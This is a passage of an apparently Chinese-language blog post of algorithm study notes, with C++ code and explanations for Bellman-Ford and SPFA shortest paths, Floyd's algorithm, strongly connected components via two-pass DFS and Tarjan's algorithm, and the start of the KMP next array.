class="comment">//松弛操作</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，如果图中没有从源点可以到达的负环，那么数组 d 中的所有值已经到达最优。因此，只需要对所有的边进行一轮操作，判读是否某条边 u-&gt;v 仍然满足 d [u] + length [u-&gt;v] &lt; d [v]，如果有，则说明图中有从源点可达的负环，返回 false，否则，说明数组 d 中所有值都达到最优，返回 true。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(each edge u-&gt;v)&#123;   <span class="comment">//对每条边进行判断</span></span><br><span class="line"><span class="keyword">if</span>(d[u] + length[u-&gt;v] &lt; d[v])&#123;   <span class="comment">//如果仍可以被松弛</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;   <span class="comment">//说明图中有从源点可达的负环</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">//数组d的所有值已经达到最优</span></span><br></pre></td></tr></table></figure><p>这里给出临界表的方法，由于 Bellman-Ford 需要遍历所有的边，故邻接矩阵使用时可能会导致复杂度上升的问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line"><span class="type">int</span> v,dis;  <span class="comment">//v是邻接表的目标顶点，dis为邻接边的边权</span></span><br><span class="line">&#125;</span><br><span class="line">vector&lt;Node&gt; Adj[MAX_V];   <span class="comment">//G的邻接表</span></span><br><span class="line"><span class="type">int</span> n;   <span class="comment">//n为定点数</span></span><br><span class="line"><span class="type">int</span> d[MAX_V];   <span class="comment">//起点到达各个点的最短路径长度</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Bellman</span><span class="params">(<span class="type">int</span> s)</span></span>&#123;</span><br><span class="line"><span class="built_in">fill</span>(d, d+ MAX_V, INF);</span><br><span class="line">d[s] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i= <span class="number">0</span>; i&lt;n<span class="number">-1</span> ; i++)&#123;   <span class="comment">//进行n - 1 轮操作</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> u = <span class="number">0</span>;u &lt; n ;u++)&#123;    <span class="comment">//每轮操作都遍历所有边</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; Adj[u].<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line"><span class="type">int</span> v =Adj[u][j].v;  <span class="comment">//邻接边的顶点</span></span><br><span class="line"><span class="type">int</span> dis = Adj[u][j].dis;  <span class="comment">// 邻接边的边权</span></span><br><span class="line"><span class="keyword">if</span>(d[u] + dis &lt; d[v])&#123;  <span class="comment">//以u为中介点可以使d[v]更小</span></span><br><span class="line">d[v] = d[u] + dis; <span class="comment">//松弛操作</span></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//下面是判断负环的代码</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> u = <span class="number">0</span> ;u &lt; n; u++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; Adj[u].<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line"><span class="type">int</span> v = Adj[u][j].v;</span><br><span class="line"><span class="type">int</span> dis = Adj[u][j].dis;</span><br><span class="line"><span class="keyword">if</span>(d[u] + dis &lt; d[v])&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然 Bellman-Ford 算法的思路很简洁，但是由于其 O (VE) 的时间复杂度确实较高，在很多情况下并不尽人意。其实，BF 算法的每轮操作都需要操作所有边的话，显然其中会有重复的无意义操作，严重影响了算法的性能。<strong>只有当某个 1 顶点 u、的 d [u] 的值改变时，从它出发的边的邻接点 v 的 d [v] 值才有可能被改变。</strong> 由此可以进行一个<strong>优化：</strong> 建立一个队列，每次将队列队首顶点 u 去除，然后对从 u 出发的所有边 u-&gt;v 进行松弛操作，也就是判断 d [u] + length [u-&gt;v] &lt; d [v] 是否成立，如果成立，则用 d [u] + length [u-&gt;v] 覆盖 d [v]，于是 d [v] 获得更优的值，如果 v 不再队列中，就把 b 加入队列。这样操作直到队列为空（说明图中没有从源点可达的负环），或者是某个顶点入队次数超过 V-1。下面是伪代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">queue&lt;<span class="type">int</span>&gt; Q;</span><br><span class="line">源点s入队;</span><br><span class="line"><span class="keyword">while</span>(队列非空)&#123;</span><br><span class="line">取出队首元素u;</span><br><span class="line"><span class="keyword">for</span>(u的所有邻接边u-&gt;v)&#123;</span><br><span class="line"><span class="keyword">if</span>(d[u] + dis &lt; d[v])&#123;</span><br><span class="line">d[v] = d[u] + dis;</span><br><span class="line"><span class="keyword">if</span>(v当前不在队列)&#123;</span><br><span class="line">v入队;</span><br><span class="line"><span class="keyword">if</span>(v入队次数大于n<span class="number">-1</span>)&#123;</span><br><span class="line">说明有可达负环,<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种优化后的算法被称为<strong> SPFA</strong>，它的期望时间复杂度是 O (KE)，E 是图的变数，K 是常数，在很多情况下 k 不超过 2. 但是如果图中有从源点可达的负环，则时间复杂度会退化程 O (VE。理解<strong> SPFA 的关键是它如何从 Bellman-Ford 算法优化而来的</strong>。</p><h4 id="floyd算法"><a class="markdownIt-Anchor" href="#floyd算法">#</a> Floyd 算法</h4><p>弗洛伊德算法可以用来解决<strong>全源最短路径问题</strong>，即对给定的图 G (V,E)，求任意两点 u，v 之间的最短路径长度，时间复杂度为 O (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">n^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span>)。由于其复杂度限制了定点数 n 在 200 以内，因此使用邻接矩阵来实现 Floyd 算法是非常合适和方便的。<br>Floyd 算法基于这样一事实：如果存在顶点 k，使得以 k 作为中介点时顶点 i 和顶点 j 的当前最短距离缩短，则使用顶点 k 作为顶点 i 和顶点 j 的中介点，即当 dis [i][k] + dis [k][j] &lt; dis [i][j] 时，令 dis [i][j] = dis [i][k] + dis [k][j]。<br>基于上面的事实，Floyd 算法的流程非常简单，代码也很简洁：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">\<span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line">\<span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF = <span class="number">1000000000</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX_V = <span class="number">200</span>;  <span class="comment">//MAX_V为最大顶点数</span></span><br><span class="line"><span class="type">int</span> n,m;   <span class="comment">//n为顶点数，m为边数</span></span><br><span class="line"><span class="type">int</span> dis[MAX_V][MAX_V];  <span class="comment">//dis[i][j]表示顶点i和顶点j的最短距离</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Floyd</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(dis[i][k] != INF &amp;&amp; dis[k][j] != INF &amp;&amp; dis[i][k] + dis[k][j] &lt; dis[i][j])&#123;</span><br><span class="line">dis[i][j] = dis[i][k] + dis[k][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int main()&#123;</span></span><br><span class="line"><span class="comment"> int u, v, w;</span></span><br><span class="line"><span class="comment"> fill(dis[0], dis[0] + MAX_V * MAX_V, INF);</span></span><br><span class="line"><span class="comment"> scanf()</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="图论难点"><a class="markdownIt-Anchor" href="#图论难点">#</a> 图论难点</h2><h3 id="强连通分量分解"><a class="markdownIt-Anchor" href="#强连通分量分解">#</a> 强连通分量分解</h3><p>【定义】对于一个有向图顶点的子集 S, 如果在 S 内任取两个顶点 u 和 v，都能找到一条从 u 到 v 的路径，那么就称 S 是强连通的。如果在强连通的顶点集合 S 中加入其他任意顶点集合后，它都不再是强连通的，那么就称 S 是原图的一个强连通分量。任意的有向图都可以分解成若干个不相交的强连通分量，这就是强连通分量分解。把分解后的强连通分量缩成一个顶点，就得到了一个 DAG（有向无环图）。</p><blockquote><p>强连通分量的分解可以通过两次简单的 DFS 实现。<br>第一次 DFS 时，选取任意顶点作为起点，遍历所有尚未访问过的顶点，并在回溯前给顶点标号。对剩余的未访问过的顶点，不断重复上述过程。<br>完成标号后，越接近图的尾部（搜索树的叶子节点），顶点的标号越小。第二次 DFS 时，先将所有边反向，然后以标号最大的顶点为起点进行 DFS|。这样 DFS 所遍历的顶点集合就构成了一个强连通分量。之后，只要还有尚未访问的顶点，就从中选取标号最大的顶点不断重复上述过程。<br>(注：反向之后在当前节点能够访问到的顶点即是双向可达的，因此可通过这个连看哪些顶点是联通的)</p></blockquote><p>将强连通分量缩点并得到 DAG。此时可以发现，标号最大的节点就属于 DAG 头部（搜索树的根）的强连通分量。因此，将边反向之后，就不能沿边访问到这个强连通分量以外的顶点。而对于强连通分量内的其他顶点，其可达性不受边反向的影响，因此在第二次 DFS 时，我们可以遍历一个强连通分量的所有顶点。<br>下面上代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> V; <span class="comment">// 定点数</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; G[MAX_V];  <span class="comment">//图的邻接边表示</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; rG[MAX_V]; <span class="comment">//把边反向后的表示</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; vs;  <span class="comment">//后序遍历顺序的定点列表</span></span><br><span class="line"><span class="type">bool</span> used[MAX_V];   <span class="comment">//访问标记</span></span><br><span class="line"><span class="type">int</span> cmp[MAX_V]; <span class="comment">//所属强连通分量的拓扑序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_edge</span><span class="params">(<span class="type">int</span> from,<span class="type">int</span> to)</span></span>&#123;</span><br><span class="line">G[from].<span class="built_in">push_back</span>(to);</span><br><span class="line">rG[to].<span class="built_in">push_back</span>(from);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> v)</span></span>&#123;</span><br><span class="line">used[v] = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; G[v].<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!used[G[v][i]]) <span class="built_in">dfs</span>(G[v][i]);</span><br><span class="line">&#125;</span><br><span class="line">vs.<span class="built_in">push_back</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rdfs</span><span class="params">(<span class="type">int</span> v, <span class="type">int</span> k)</span></span>&#123;</span><br><span class="line">used[v] = <span class="literal">true</span>;</span><br><span class="line">cmp[v] = k;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; rG[v].<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!used[rG[v][i]]) <span class="built_in">rdfs</span>(rG[v][i],k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">scc</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(used, <span class="number">0</span>,<span class="built_in">sizeof</span>(used));</span><br><span class="line">vs.<span class="built_in">clear</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> v = <span class="number">0</span>;v&lt; V;v++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!used[v]) <span class="built_in">dfs</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(used, <span class="number">0</span>,<span class="built_in">sizeof</span>(used));</span><br><span class="line"><span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = vs.<span class="built_in">size</span>() - <span class="number">1</span>; i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="keyword">if</span>(!used[vs[i]]) <span class="built_in">rdfs</span>(vs[i],k++);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> k;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里给出一个例题，</p><h3 id="2-sat"><a class="markdownIt-Anchor" href="#2-sat">#</a> 2-SAT</h3><h3 id="tarjan算法强连通分量缩点"><a class="markdownIt-Anchor" href="#tarjan算法强连通分量缩点">#</a> Tarjan 算法 (强连通分量 / 缩点)</h3><p>首先，我们知道最基础的 DFS 算法对图进行搜索通过 vis 数组来判断是否访问某个节点，不过这里我们引入一个叫做<strong>时间戳</strong>的概念，代表<strong>每个节点第一次被访问的时间</strong>。如果我们用 tot 变量作为当前的时间，每访问一个节点 tot++。<strong>越先访问的节点的时间戳越小，越后访问的节点时间戳越大</strong>。在下面的代码中，我们用<strong> dfn</strong> 数组作为每个点的时间戳，这样就可以取代 vis 数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> dfn[MAXN],tot = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">dfn[u] = ++tot;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> e = first[u];e;e=nxt[e])&#123;</span><br><span class="line"><span class="type">int</span> v = go[e];</span><br><span class="line"><span class="keyword">if</span>(!dfn[v]) <span class="built_in">dfs</span>(v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里强调一下：dfn [] 数组随访问顺序严格单调递增。其为我们寻找强连通分量奠定基础。在介绍如何寻找强连通分量之前，我们必须用 dfs 对图的边进行分类。图的边分为 4 类：<br><strong>（1）树边</strong> 指深度优先搜索树上的边。具体来说如果没有访问过，接下来要从 v 开始搜索，那么边 u-&gt;v 就是树边。<br><strong>（2）后向边</strong> 指将节点 u 连接到其在深度优先搜索树中的祖先节点 v 的边 u-&gt;v。我们可以直到，后向边一定有：   <code>dfn[v] !=0 &amp;&amp; dfn[v] &lt;= dfn[u]</code>  即：v 被访问过，且 v 比 u 先被访问。<br><strong>（3）前向边</strong> 和后向边相反，v 被访问过，且 v 比 u 后被访问。<br><strong>（4）横向边</strong> 所有其他的边被称为横向边满足以下性质 u-&gt;v 满足 dfn [u] &gt; dfn [v]。<br>强连通分量的定义上面已经给出。简单来说<strong>一个强连通分量的每两个点可以互相到达，且这个强连通分量的节点数尽可能大</strong>。<br>这里给出一个很重要的定理：<strong>若存在后向边 u-&gt;v，则 u,v 在同一个强连通分量中</strong><br>下面正式介绍 Tarjan 算法。我们如何判断一条边是不是后向边：可以看出，后向边 u-&gt;v 满足 dfn [v]&lt;=dfn [u]，同时横向边也满足此条件，因此我们不能简单根据 dfn 数组进行判断。<br><strong>解决</strong>：我们考虑维护一个<strong>栈</strong>，栈中的元素是当前搜索树上的点。显然，如果一条边 u-&gt;v 是后向边，那么我们在访问 u 时会发现<strong> v 已经在栈中</strong>。然后，如果 dfn [v]&lt;dfn [u]，则 u-&gt;v 是后向边。可以定义<strong> instack 数组</strong>，节点 u 入栈时 instack [u]=true，出栈时置为 false。在知道了 u-&gt;v 是后向边之后，我们再引入一个 low 数组，low [u] 代表<strong>包含 u 的 SCC 中第一个被搜索到的节点的 dfn 值</strong>，也可以理解为<strong>从 u 出发能回溯到的 dfn 最小节点的 dfn 值</strong>。显然，若 u-&gt;v 是一个后向边，那么 v 是 u 的祖先，v 是 v，u 所在的 SCC 中最先被访问到的节点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> dfn[MAXN], tot = <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> instack[MAXN];</span><br><span class="line"><span class="type">int</span> low[MAXN];</span><br><span class="line">std::stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dfn[u] = ++tot;</span><br><span class="line">    low[u] = dfn[u]; <span class="comment">// 一开始low[u]是自己，有后向边再更新</span></span><br><span class="line">    stk.<span class="built_in">push</span>(u);</span><br><span class="line">    instack[u] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> e = first[u]; e; e = nxt[e])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v = go[e];</span><br><span class="line">        <span class="keyword">if</span>(!dfn[v])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">dfs</span>(v);</span><br><span class="line">            low[u] = <span class="built_in">min</span>(low[u], low[v]); <span class="comment">// 子节点更新了，我也要更新</span></span><br><span class="line">            <span class="comment">// 若子节点没更新，则min能够保证low[u] == dfn[u]</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(instack[v]) <span class="comment">// v访问过且在栈中，意味着u→v是后向边</span></span><br><span class="line">        &#123;</span><br><span class="line">            low[u] = <span class="built_in">min</span>(low[u], dfn[v]);</span><br><span class="line">            <span class="comment">// 此处用min的原因是u→v可能是前向边，此时dfn[v]&gt;dfn[u]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    stk.<span class="built_in">pop</span>();</span><br><span class="line">    instack[u] = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> dfn[MAXN], tot = <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> instack[MAXN];</span><br><span class="line"><span class="type">int</span> low[MAXN];</span><br><span class="line"><span class="type">int</span> co[MAXN], col = <span class="number">0</span>;</span><br><span class="line">std::stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Tarjan</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dfn[u] = ++tot;</span><br><span class="line">    low[u] = dfn[u]; <span class="comment">// 一开始low[u]是自己，有后向边再更新</span></span><br><span class="line">    stk.<span class="built_in">push</span>(u);</span><br><span class="line">    instack[u] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> e = first[u]; e; e = nxt[e])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v = go[e];</span><br><span class="line">        <span class="keyword">if</span>(!dfn[v])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Tarjan</span>(v);</span><br><span class="line">            low[u] = <span class="built_in">min</span>(low[u], low[v]); <span class="comment">// 子节点更新了，我也要更新</span></span><br><span class="line">            <span class="comment">// 若子节点没更新，则min能够保证low[u] == dfn[u]</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(instack[v]) <span class="comment">// v访问过且在栈中，意味着u→v是后向边</span></span><br><span class="line">        &#123;</span><br><span class="line">            low[u] = <span class="built_in">min</span>(low[u], dfn[v]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(low[u] == dfn[u]) <span class="comment">// 是SCC中的第一个被访问的节点</span></span><br><span class="line">    &#123;</span><br><span class="line">        co[u] = ++col;</span><br><span class="line">        <span class="keyword">while</span>(stk.<span class="built_in">top</span>() != u) co[stk.<span class="built_in">top</span>()] = col, instack[stk.<span class="built_in">top</span>()] = <span class="literal">false</span>, stk.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="comment">// 染色，弹栈</span></span><br><span class="line">        instack[u] = <span class="literal">false</span>;</span><br><span class="line">        stk.<span class="built_in">pop</span>(); <span class="comment">// 最后把u弹出去</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考文献：<a href="https://blog.csdn.net/qaqwqaqwq/article/details/119884138?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170161277716800197087616%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170161277716800197087616&amp;biz_id=0&amp;spm=1018.2226.3001.4187">Tarjan 算法超超超详解</a></p><h1 id="字符串"><a class="markdownIt-Anchor" href="#字符串">#</a> 字符串</h1><h2 id="kmp算法"><a class="markdownIt-Anchor" href="#kmp算法">#</a> KMP 算法</h2><p>KMP 算法主要用来进行判断两个字符串是否 A 是 B 的子串。暴力的解法十分简单，1 只需要一一枚举文本串的起始位置 i 然后和模式串进行逐位匹配即可。</p><h4 id="next数组"><a class="markdownIt-Anchor" href="#next数组">#</a> next 数组</h4><p>介绍 KMP 算法要先来学习一下 Next 数组。假设有一个字符串 s (下标从 0 开始)，那么它以 i 号位作为结尾的子串就是 s [0…i]。对该子串来说，长度位 k+1 的前缀和后缀分别时 s [0…k] 和 s [i-k…i]。现在定义一个 int 型数组 next，其中<strong> next [i] 表示子串 s [0…i] 的前缀 s [0…k] 等于后缀 s [i-k…i] 的最大的 k (注意前缀和后缀可以部分重叠，但不能是 s [0…i] 本身)</strong> 如果找不到相等的前后缀，那么就令 next [i]= -1。显然，<strong>next [i] 就是所求最长相等前后缀中前缀最后一位的下标。</strong><br>这里可以利用递推来进行 Next 数组的求解。假设已经求出了 next [0]~next [i-1]，现在用它们来推出 next [i]。<br>通过这样可以列出下面伪代码求解过程:</p><ul><li>①初始化 next 数组，令 j = next [0] = -1。</li><li>②让 i 在 1 ~ len -1 范围遍历，对每一个 i，执行③④，求解 next [i]。</li><li>③不断令 j = next [i]，直到 j 回退为 - 1，或者是 s [i] == s [j+1] 成立。</li><li>④如果 s [i] == s [j+1]，则 next [i] = j +1; 否则 next [i] = j。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">getNext</span><span class="params">(<span class="type">char</span> s[], <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> j = <span class="number">-1</span>;</span><br><span class="line">next[<span class="number">0</span>] = <span class="number">-1</span>;    <span class="comment">//初始化 j= next[0] = -1</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len;i++)&#123;   <span class="comment">//求解 next[1] ~ next[len -1]</span></span><br><span class="line"><span class="keyword">while</span>(j != <span class="number">-1</span> &amp;&amp;s[i] != s[j+<span class="number">1</span>])&#123;</span><br><span class="line">j = next[j];   <span class="comment">//反复令 j =next[j]</span></span><br><span class="line">&#125;   <span class="comment">//直到j回退到-1，或是 s[i] == s[j+1]</span></span><br><span class="line"><span class="keyword">if</span>(s[i] == s[j+<span 